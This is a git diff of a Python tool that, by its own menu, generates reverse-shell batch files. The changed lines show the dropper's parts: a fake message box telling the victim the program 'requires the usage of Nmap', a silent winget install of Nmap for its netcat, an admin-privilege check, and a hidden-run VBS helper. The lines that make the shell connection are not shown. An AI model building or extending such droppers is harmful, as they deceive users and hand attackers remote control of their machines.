@@ -21,12 +21,11 @@ def generate_and_execute_batch(port, shell):
 
     batch_script = f"""@echo off
 
-echo MSGBOX "This program requires the usage of Nmap, please continue with installation" > %temp%\TEMPmessage.vbs
+echo MSGBOX "This program requires the usage of Nmap, please continue with installation, you mayve prompted this messgae again" > %temp%\TEMPmessage.vbs
 call %temp%\TEMPmessage.vbs
 del %temp%\TEMPmessage.vbs /f /q
 
 :: Netcat install (assume user doesnt have)
-
 winget install -e --id Insecure.Nmap
 
 :: Check for admin privileges
@@ -56,7 +55,6 @@ del run_silent.vbs
 
 exit
 """
-
     try:
         with open(batch_file_name+".bat", "w") as f:
             f.write(batch_script)
@@ -68,7 +66,6 @@ exit
 
 print("[0] Generate Reverse shell file [1] Help [2] Exit")
 main = input("Enter Choice>>> ")
-
 if "0" in main:
     port_number = input("Enter the port number>>> ") 
     shell_type = input("Enter the shell >>> ")
